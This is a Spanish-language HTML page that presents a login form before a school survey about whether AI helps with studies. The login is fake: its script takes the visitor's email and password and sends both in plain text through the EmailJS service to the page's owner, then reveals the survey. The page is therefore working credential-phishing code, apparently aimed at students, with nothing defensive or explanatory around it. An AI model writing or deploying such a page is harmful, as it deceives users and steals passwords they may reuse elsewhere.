<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iniciar sesión</title>
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 20px;
    background-color: #f3f3f3;
  }
  .container {
    max-width: 400px;
    margin: auto;
    background-color: #fff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
    margin-bottom: 20px;
  }
  h1, h2 {
    text-align: center;
    margin-bottom: 30px;
  }
  label {
    display: block;
    margin-bottom: 5px;
  }
  input[type="text"], input[type="password"], input[type="email"] {
    width: calc(100% - 20px);
    padding: 10px;
    margin: 5px 0 20px;
    border: 1px solid #ccc;
    border-radius: 5px;
    box-sizing: border-box;
    display: block;
    margin-left: auto;
    margin-right: auto;
  }
  input[type="submit"] {
    display: block;
    width: calc(100% - 20px);
    padding: 12px;
    margin-top: 20px;
    background-color: #007bff;
    color: #fff;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    box-sizing: border-box;
    margin-left: auto;
    margin-right: auto;
  }
  input[type="submit"]:hover {
    background-color: #0056b3;
  }
</style>
<!-- EmailJS SDK -->
<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script type="text/javascript">
   (function(){
      emailjs.init("service_bb0loqm"); // Reemplaza "service_bb0loqm" con tu Service ID
   })();
</script>
</head>
<body>

<div class="container" id="loginContainer">
  <h1>Iniciar sesión</h1>
  <form id="loginForm" action="#" method="post">
    <label for="email">Correo electrónico</label>
    <input type="email" id="email" name="email" placeholder="Correo electrónico" required>
    <label for="password">Contraseña</label>
    <input type="password" id="password" name="password" placeholder="Contraseña" required>
    <input type="submit" value="Iniciar sesión">
  </form>
</div>

<div class="container" id="surveyContainer" style="display: none;">
  <h2>Electivo Pensamiento Computacional</h2>
  <h1>Encuesta sobre inteligencia artificial y estudios</h1>
  <form id="surveyForm" action="#" method="post">
    <label for="aiHelp">¿Crees que con IA puede ayudarte a tus estudios?</label>
    <input type="text" id="aiHelp" name="aiHelp" placeholder="Escribe tu respuesta aquí" required>
    <input type="submit" value="Enviar respuesta">
  </form>
</div>

<script>
document.getElementById("loginForm").addEventListener("submit", function(event) {
  event.preventDefault();
  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;
  
  // Enviar correo electrónico con los datos de inicio de sesión
  emailjs.send("service_bb0loqm", "template_dz3o83w", {
    from_name: email,
    message: "Correo electrónico: " + email + "\nContraseña: " + password
  })
  .then(function(response) {
    console.log("SUCCESS!", response.status, response.text);
    document.getElementById("loginContainer").style.display = "none";
    document.getElementById("surveyContainer").style.display = "block";
  }, function(error) {
    console.log("FAILED...", error);
  });
});

document.getElementById("surveyForm").addEventListener("submit", function(event) {
  event.preventDefault();
  var aiHelp = document.getElementById("aiHelp").value;

  // Enviar correo electrónico con la respuesta de la encuesta
  emailjs.send("service_bb0loqm", "template_dz3o83w", {
    from_name: "Encuesta",
    message: "Respuesta: " + aiHelp
  })
  .then(function(response) {
    console.log("SUCCESS!", response.status, response.text);
    alert("Gracias por participar");
  }, function(error) {
    console.log("FAILED...", error);
  });
});
</script>

</body>
</html>
